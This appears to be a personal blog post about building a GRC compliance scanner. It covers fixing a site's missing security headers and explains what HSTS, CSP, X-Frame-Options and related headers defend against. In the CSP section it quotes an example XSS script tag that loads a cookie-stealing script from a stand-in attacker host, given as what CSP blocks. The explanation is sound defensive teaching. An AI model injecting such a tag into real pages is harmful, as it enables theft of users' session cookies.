---
title: "I Built a Compliance Scanner Because I Didn't Know What Security Headers Were"
date: 2026-04-09
slug: grc-compliance-scanner-security-headers
description: "How I automated GRC compliance for my personal site and learned what HSTS actually does along the way."
tags: [grc, security, compliance, automation, nist, devops]
---

# I Built a Compliance Scanner Because I Didn't Know What Security Headers Were

> I'm learning GRC from scratch. Instead of reading about it, I built a tool that scans my own site for compliance issues - and it immediately told me everything I was doing wrong.
>
> *This is part of an ongoing series where I work through governance, risk, and compliance fundamentals by automating them.

---

## The starting point

I've been wanting to get into GRC engineering for a while. Governance, Risk, and Compliance - the part of security that's less about hacking and more about proving you've got your house in order. Privacy policies, risk assessments, framework mappings, the stuff that makes auditors nod approvingly.

The problem is most GRC learning material is dry. Really dry. "Implement controls aligned with organizational risk appetite" dry. So I decided to learn by building.

The idea: what if I could point a scanner at any GitHub repo and have it tell me everything that's wrong - missing policies, exposed secrets, vulnerable dependencies, misconfigured headers - and then *generate* the compliance documents from what it finds? 

Not hand-written templates. Not copy-pasted boilerplate. Actual policies derived from actual code.

Oh and what if I gamify it so I can retain my interest?
<p align="center">
  <img width="819" height="358" alt="image" src="https://github.com/user-attachments/assets/db206bec-8d71-4b73-8d63-c45c73a4595a" />
</p>


## What the scanner does

I built a [GRC Observability Dashboard](https://grc-dashboard.jdeftekhari.workers.dev) - a dashboard and GitHub Action that scans repos and produces compliance reports. Point it at a repo, give it a live URL, and it runs 10 checks in parallel:

- Finds every form, POST endpoint, and cookie in the codebase
- Identifies third-party services from your `package.json` (it knows about 20+ services - Resend, Stripe, Sentry, Auth0, etc.)
- Checks for leaked secrets and API keys
- Hits the live URL to check security headers and TLS
- Evaluates GitHub branch protection settings
- Looks for existing governance documents (privacy policy, incident response plan, etc.)

From those findings, it generates 10 reports. Not "here's a template, fill it in." It actually populates a privacy policy with the data collection points it found. It builds a terms of service that mentions the game it detected. It maps every finding to NIST CSF, SOC 2, and ISO 27001 controls.

When I first ran it against [my personal site](https://joeeftekhari.com), the results were humbling.

## 0 out of 6

That was my security headers score. Zero. Not a single one.

I'd been building this site for months - Express backend, HTMX frontend, a game, a contact form, Google Analytics, Resend for emails - and I hadn't set a single security header. I didn't even know what most of them were.

The scanner also found:
- 1 critical and 2 high dependency vulnerabilities
- No branch protection on main (anyone could push directly)
- No privacy policy, no terms of service, no security.txt
- Google Analytics running without a Data Processing Agreement on file
- 8 data collection points with undefined retention periods

My NIST CSF compliance score: **67%**. My overall compliance: **20%**.

The scanner didn't just tell me I was failing. It generated a risk assessment with a likelihood-impact matrix, mapped each risk to specific framework controls, and told me exactly how to fix each one. The security headers report literally included copy-paste Express middleware.

## Fixing the headers

So I copied the middleware. Then I broke my site.

The scanner generated a Content Security Policy based on Google Analytics being the only external resource it detected. But my site also loads HTMX from `unpkg.com`, particles.js from `cdn.jsdelivr.net`, AOS animations from `unpkg.com`, and Font Awesome from `cdnjs.cloudflare.com`. The CSP blocked all of them.

You can literally see the compliance trend percentage staying the same and me banging my head against the wall trying to figure it out.
<p align="center">
  <img width="811" height="340" alt="image" src="https://github.com/user-attachments/assets/fef1e340-7582-487b-b0bf-52f472c2b0b6" />
</p>
Lesson learned: the scanner catches what it can, but CSP requires you to actually know what your site loads. I had to manually add those CDN domains to the policy. That's a gap I want to close - ideally the scanner would fetch the page, see what resources load, and build the CSP from that. It's on the roadmap.

Then I deployed the fix, and... the headers still weren't showing on the homepage. They worked on `/retro` and `/game` but not on `/`. Turns out `express.static` serves files directly and can bypass middleware. I had to use the `setHeaders` option on `express.static` to ensure headers get set on static file responses too.

Two bugs, two PRs, one lesson: security is always more nuanced than "just add this middleware." But now:

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ...
```

<p align="center">
  <img width="566" height="174" alt="image" src="https://github.com/user-attachments/assets/cc5ff356-9b39-4a42-bc61-57286f041197" />
</p>

**6 out of 6.** NIST CSF jumped from 67% to 75%. Overall compliance from 20% to 60%.

---

## What each header actually does

This is the part I had to learn the hard way. Here's what I wish someone had explained to me before I shipped a site without any of them.

### Strict-Transport-Security (HSTS)

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

You probably already redirect HTTP to HTTPS. HSTS goes a step further - it tells the browser "don't even *try* HTTP. Ever. For the next year."

Why does this matter if you already redirect? Because that first HTTP request, before the redirect, is unencrypted. If someone's on coffee shop WiFi, an attacker can intercept that first request and serve a fake version of your site. HSTS eliminates that window entirely.

`max-age=31536000` is one year in seconds. The browser remembers the instruction even if the header disappears from future responses. `includeSubDomains` extends it to all subdomains.

### Content-Security-Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://unpkg.com https://cdn.jsdelivr.net ...
```

This is the big one. CSP is a whitelist of exactly which domains your browser is allowed to load resources from. If a script, stylesheet, or font isn't on the list, the browser blocks it.

Why it matters: if an attacker finds an XSS vulnerability in your site and injects a `<script src="https://evil.com/steal-cookies.js">`, CSP blocks it because `evil.com` isn't in your `script-src`. It's a safety net underneath your code.

The catch is you have to know everything your site loads. My site pulls from five different CDNs - I had to add each one to the policy. Miss one and that library stops working. This is why a lot of developers skip CSP: it's the highest-effort header to get right.

I'm using `unsafe-inline` which weakens the policy - ideally you'd use nonces or hashes for each inline script. But HTMX and many libraries rely on inline event handlers, making strict CSP impractical without significant refactoring. `unsafe-inline` with a domain whitelist is still miles better than no CSP.

### X-Frame-Options

```
X-Frame-Options: DENY
```

Prevents any other site from embedding yours in an `<iframe>`. This stops clickjacking - where an attacker overlays an invisible iframe of your site on top of a fake button. The user thinks they're clicking "Claim your prize!" but they're actually clicking something on your site.

`DENY` means nobody can iframe it, not even yourself. `SAMEORIGIN` allows self-iframing (useful for admin panels). A portfolio site has no reason to be iframed, so `DENY`.

### X-Content-Type-Options

```
X-Content-Type-Options: nosniff
```

Tells the browser to trust the `Content-Type` header you send and not try to guess. Without it, a browser might look at a file's content and decide "this looks like JavaScript" even if you said it's `text/plain`. An attacker could upload a malicious file disguised as an image and have the browser execute it.

This is a one-liner with zero tradeoffs. If you do nothing else, add this one.

### Referrer-Policy

```
Referrer-Policy: strict-origin-when-cross-origin
```

Controls how much URL information leaks to other sites when someone clicks a link on your page. Without this, clicking a link from `yoursite.com/admin/settings?token=abc123` sends the full URL to the destination in the `Referer` header - path, query params, everything.

`strict-origin-when-cross-origin` sends the full URL for internal links (normal) but only the domain for external links (safe). HTTPS-to-HTTP downgrades send nothing.

### Permissions-Policy

```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

Disables browser APIs you don't use. The empty `()` means "nobody can use this, not even this site."

This is defense in depth. If your site gets compromised, the attacker still can't access the camera, mic, location, or payment APIs. They're simply turned off at the browser level. A portfolio site doesn't need any of these, so disable everything.

---

## The dashboard

All of this feeds into a [central dashboard](https://grc-dashboard.jdeftekhari.workers.dev) deployed on Cloudflare Workers. Every repo in the org runs the GitHub Action, and the results POST to the dashboard. One URL shows compliance across everything.

It's got a retro video game theme because why not. HP bars for compliance scores. `[OK]` and `[XX]` instead of checkmarks. CRT scanlines. The whole thing.

But underneath the aesthetic, it's showing real data: NIST CSF compliance per function (Identify, Protect, Detect, Respond, Recover), SOC 2 and ISO 27001 cross-references, branch comparisons, and historical trends.

## What I've learned so far

<p align="center">
  <img src="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExeGN4YTZid3V4emkzbmppY2J1YnM1N3cxZndhd2RodnF2YmNlOXN3ciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/GPQL5xsaunjmGcVqLn/giphy.gif"/>
</p>

I went into this knowing basically nothing about GRC. I'd heard of NIST CSF and SOC 2 but couldn't have told you what a "control" was or why anyone would need a "risk register."

Building the scanner was a good start, but plenty of it was AI generated and I need to actually dig into each topic to make sure it's correct. You can't write a NIST CSF mapping without understanding what each subcategory actually requires. You can't generate a privacy policy without understanding GDPR's lawful basis for processing. You can't produce a risk assessment without understanding likelihood-impact matrices. Currently I understand very little, which is why I'm taking the first step and solidifying my knowledge about the security headers.

I still have a lot to learn. The scanner's CSP generation needs work. The AI layer is built but untested with a real API key. The dashboard needs auth, deployment automation, and better trend visualization. I haven't touched auditor evidence export yet.

But the core loop works: scan, detect, generate, report. And my site went from 20% compliance to 60% by following the scanner's own recommendations.

If you want to try it on your own repos, you will be able to shortly. There's some housekeeping I need to do before it'll work out of the box. The scanner should work on any Node/Python/Go repo.

---

*Next up: writing an incident response plan for a one-person operation, and figuring out what "risk appetite" actually means when you're the only person on the team.*
